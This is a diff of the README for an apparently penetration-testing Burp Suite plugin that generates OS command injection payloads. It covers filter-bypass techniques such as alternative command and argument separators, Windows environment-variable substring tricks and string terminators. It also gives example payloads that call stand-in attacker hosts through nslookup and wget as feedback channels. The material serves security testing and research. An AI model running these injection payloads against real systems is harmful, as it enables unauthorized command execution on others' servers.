@@ -10,7 +10,7 @@ It comes in the form of a Burp Suite plugin with the following main functionalit
 * Intruder payload provider
 * Scanner extension
 * Payload export to clipboard/file
-* single byte generator
+* Single byte generator
 
 The plugin can be used with the free Burp Community version, with its inherent limitations.
 
@@ -27,19 +27,29 @@ This documentation has two purposes:
 		* Bad characters
 		* Regular expressions
 	* Platform-specific conditions
-	* The feedback channel
+	* The problem of the feedback channel
 * Using the tool
-	* Difference between manual mode vs auto
-	* Modules
-		* Scanner
-		* Intruder
-		* Export
-		* Byte generator
-	* Advanced and experimental settings
+	* Feedback channels
+		* DNS
+		* time
+	* Payload marking
+	* Difference between manual and automatic mode
+		* The auto mode
+		* Manual mode
 	* Different approaches to using this tool
+	* Scanner
+	* Intruder
+	* Export
+	* Byte generator
+	* Injection modes
+		* Command injection
+		* Argument injection
+		* Terminal injection
+	* Other recommended tools and projects
 	* Problems and future improvements
 
-## Methodology - identifying possible reasons of false negatives (missed vulnerabilities)
+
+# Methodology - identifying possible reasons of false negatives (missed vulnerabilities)
 
 Problems to face when creating OS command injection payloads:
 * the eventual syntax of the expression we are injecting into (e.g. quoted expressions)
@@ -50,7 +60,7 @@ Problems to face when creating OS command injection payloads:
 The purpose of creating this tool was to reach the non-trivial OS command injection cases, which stay undetected by generally known and used tools and sets of payloads. 
 
 
-### The syntax problem
+## The syntax problem
 
 Let's consider the following vulnerable PHP script:
 ```
@@ -104,14 +114,14 @@ Double quotes:
 - `“COMMAND_SEPARATOR+ FULL_COMMAND +COMMAND_SEPARATOR”`
 
 
-### The problem of input-sanitizing mechanisms
+## The problem of input-sanitizing mechanisms
 
-#### Bad characters
+### Bad characters
 As it is generally known, blacklist-based approach is a bad security practice. In most cases, sooner or later the attackers find a way around the finite defined list of payloads/characters that are forbidden. Instead of checking if the user-supplied value contains any of the bad things we predicted (e.g. `&` or `;` characters), it's safer to check whether that data looks like it should (e.g. matches a simple regex like `^\w+$` or `^\d+$`) before using it.
 
 Many input-sanitizing functions attempt to catch all potentially dangerous characters that might give the attacker a way to control the target expression and, in consequence, execution.
 
-##### Argument separators trickery
+#### Argument separators trickery
 Let's consider the following example:
 ```
     <?php
@@ -161,7 +171,7 @@ On win:
 The above is just an example of bypassing poorly written input-sanitizing function from the perspective of alternative argument separators. 
 
 
-###### Command separators trickery
+#### Command separators trickery
 Achieving the ability of injecting arbitrary commands usually boils down to the ability of injecting valid command separators first.
 
 Below is the list of working commmand separators:
@@ -179,11 +189,11 @@ On windows:
 - `|`
 - `%1a` - a magical character working as a command separator in .bat files (discovered while researching cmd.exe to find alternative command separators - full description of the finding: http://seclists.org/fulldisclosure/2016/Nov/67)
 
-##### More witchcraft
+#### More witchcraft
 Also, what's very interesting on win is the fact that the semicolon `;` does NOT work as a command separator. 
 This is very sad, because e.g. the `%PATH%` env variable usually looks more-less like this:
 `C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;[...]`. 
-Therefore it would be great to use an alternative command separator like `%PATH:~19,1%` (substring expression that cuts out the first `;`, so it evaluates to it) with payloads like `a%PATH:~19,1%nslookup%25ProgramFiles:~10,1%25evildns.attacker.com%PATH:~19,1%`, which would evaluate to `a;nslookup evildns.attacker.com;`.
+Therefore it would be great to use an alternative command separator like `%PATH:~19,1%` (substring expression that cuts out the first `;`, so it evaluates to it) with payloads like `a%25PATH:~19,1%25nslookup%25ProgramFiles:~10,1%25evildns.attacker.com%25PATH:~19,1%25`, which would evaluate to `a;nslookup evildns.attacker.com;`.
 Unfortunately the default environmental variables under Windows do not contain any supported command separator, like `&`. 
 It WOULD work, here's why:
 
@@ -198,7 +208,7 @@ Hence, I really hoped for expression like `ls .${LS_COLORS:10:1}id` to work (eva
 `ls: cannot access '.;id': No such file or directory`. Who knows... More research is needed (especially with cmd.exe as it is not open source, but also on other shells like dash (and powershell!).
 
 
-##### String separators
+#### String separators
 Additionally, the following string terminators can be used (in case input was written into a file or a database before execution and our goal was to get rid of everything appended to our payload in order to avoid syntax issues):
 - `%00` (nullbyte)
 - `%F0%9F%92%A9` (Unicode poo character, known to cause string termination in db software like MySQL)
@@ -209,7 +219,7 @@ This way the base payload set is multiplied by all the feasible combinations of 
 The above separators could include double characters (like two spaces or two tabs, one after another). This is idea for optimisation aimed at defeating improperly written filters which only cut out single instances of banned characters, instead of removing them all. In such case two characters would get reduced to one, bypassing the filter and hitting the vulnerable function.
 
 
-#### Regular expressions
+### Regular expressions
 
 Some input sanitizers are based on regular expressions, checking if the user-supplied input does match the correct pattern (the good, whitelist approach, as opposed to a blacklist).
 Still, a good approach can be improperly implemented, creating loopholes. A few examples below.
@@ -244,7 +254,7 @@ This makes us extend our base payload set to combinations like:
 - `PREFIX+FULL_COMMAND+SUFFIX`
 
 
-### Platform-specific conditions
+## Platform-specific conditions
 
 Depending on the technology we are dealing with, some payloads working on some systems will fail on other. The examples include:
 - using windows-specific command on a nix-like system
@@ -255,7 +265,7 @@ Depending on the technology we are dealing with, some payloads working on some s
 With this in mind, the best (and currently applied) approach is to use commands and syntaxes that work the same on all tested platforms (the most basic syntax of commands like echo and ping remains the same across nix/win). If this approach turns out not to be exhaustive, alternative base payloads need to be added to the test set.
 
 
-### The problem of the feedback channel
+## The problem of the feedback channel
 
 All the above vulnerable scripts have two common features:
 - they are synchronous, meaning that the script does not return any output as long as the command has not returned results, so it is synchronous with
@@ -281,7 +291,7 @@ This is why we need alternative feedback channels (which do not necessarily mean
 A feedback channel is simply the way we collect the indicator of a successful injection.
 
 Hence, for command injection, we can have the following feedback channels:
-- directly returned output (all the above examples except the last one)
+- output (all the above examples except the last one use directly returned output, could as well be indirectly returned, e.g. visible in some other module, put into a file, sent via email and so on, all depending on what the vulnerable feature does and how it returns results)
 - response time (e.g. commands like sleep 30 will case noticeable half-minute delay, confirming that the injection was successful, however this will not work with asynchronous scripts)
 - network traffic, like reverse HTTP connections (wget http://a.collaborator.example.org), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)
 - file system (if we have access to it; we can attempt to inject commands like `touch /tmp/cmdinject` and then inspect the `/tmp` directory if the file was created - or have the customer to do it for us)
@@ -289,29 +299,65 @@ Hence, for command injection, we can have the following feedback channels:
 
 In order to avoid false negatives, when no command output is returned by the application, it is necessary to employ payloads utilizing a different feedback channel. Network, particularly DNS (watching for specific domain name lookups coming from the target - this is the main feedback channel usede by Burp Collaborator) is a very good choice, as DNS lookups are usually allowed when no other outbound traffic is permitted. Also, this option is great as it works as well with asynchronous injections.
 
-### Features and usage
-
-The following basic configuration options are available:
-- `$COMMAND` - the name of the system binary to run, the default is `'ping'` (could be changed to echo, touch, wget - basically it depends on our preferred feedback channel)
-- `$TARGET_OS` - the target operating system, possible values are `'win'`, `'nix'`, `'all'` (`'all'` is the default)
-- `$ARGUMENT` - the argument for the command, depending on the feedback channel we want to utilize. The default is `'PAYLOAD_MARK.sub.evilcollab.org'`.
-- `$payload_marking` - whether or not to use the payload marking (see below) - the default is '1' (yes).
-
-The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload identifier (a natural number), so it is possible to track the correct payload if the attack was successful. A few examples:
-
-- `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
-- `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.
 
 
+# Using the tool
+
+## Feedback channels
+Two out of above mentioned feedback channels (DNS and time) are supported automatically (can be used out of the box without any additional tools and actions). Feel free to use other feedback channels (manual mode) whenever necessary.
+
+### DNS
+
+### time
+
+## Payload marking
+The payload marking mechanism is very simple. Every single payload generated by the tool has its number (starting at 1). 
+If payload marking feature is on, upon generation, all instances of the special holder string `PAYLOAD_MARK` in the argument field are replaced with the payload number. This makes it easier to trace back the result to the successful payload that created it. 
+For example, if the command is set to `touch` and the argument is set to `/tmp/owned.PAYLOAD_MARK`, once the attack is finished and there is a file named /tmp/owned.1337, we know that payload number 1337 was the one responsible for creating the file. 
+We could likewise do something like command=`echo` and argument=`PAYLOAD_MARK>>/tmp/owned`. This way the file `/tmp/owned` would contain all the IDs of the payloads that worked.
+Third example could be command=`wget` and argument=`http://attacker.com/owned.PAYLOAD_MARK` if attacker.com is our controlled server to observe interactions.
+Fourth example could be command=`nslookup` and argument=`PAYLOAD_MARK.collaborator.attacker.com`, so if our DNS server receives a lookup like `66.collaborator.attacker.com`, we know it was triggered by the 66th payload. 
+
+If payload marking feature is off, the `PAYLOAD_MARK` holder - if present - is simply removed from the eventual payload.
+
+## Difference between manual and automatic mode
+The mode setting only applies to Intruder and Export (and is ignored by the Active Scanning extension, which is always using the automated mode regardless to this setting).
+
+### The auto mode 
+This mode is enabled by default and recommended.
+The automatic mode does not allow one to explicitly specify the command to be injected and neither its argument. In this mode, the actual command used in the payload depends on the feedback channel (e.g. `nslookup` vs `sleep`) and the target OS (e.g. `sleep 25` for nix and `ping -n 25 localhost` for win, because `sleep` is not a thing in win). 
+
+### Manual mode
+The manual mode does not allow one to specify the feedback channel. In turn, it gives control over the command and argument.
+
+## Different approaches to using this tool
+## Scanner
+## Intruder
+## Export
+## Byte generator
+
+## Other recommended tools and projects
+### Backslash Powered Scanner
+### Flow
+### Error message checks
+### Daniel's research
+
+## Injection modes
+### Command injection
+### Argument injection
+### Terminal injection
 
 
+## Problems and future improvements
+### Best effort payloads
+### More research on syntax
+### More research and evasive techniques
 
-### Using the plugin
-TBD tomorrow morning :D
+## Some case examples
+### 1) Test cases
+For example test cases (the number of all supported cases should be bigger than the total number of payloads generated) please refer to the test_cases directory. Below is a screenshot with the current results of these test cases, reflecting the coverage and tool's expected behaviour.
 
-### Case examples
-#### 1) For example test cases (the number of all supported cases should be bigger than the total number of payloads generated) please refer to the test_cases directory
-#### 2) Some real examples
+### 2) Some real examples
 - https://chris-young.net/2017/04/12/pentest-ltd-ctf-securi-tay-2017-walkthrough/
 - https://www.exploit-db.com/exploits/41892/
 
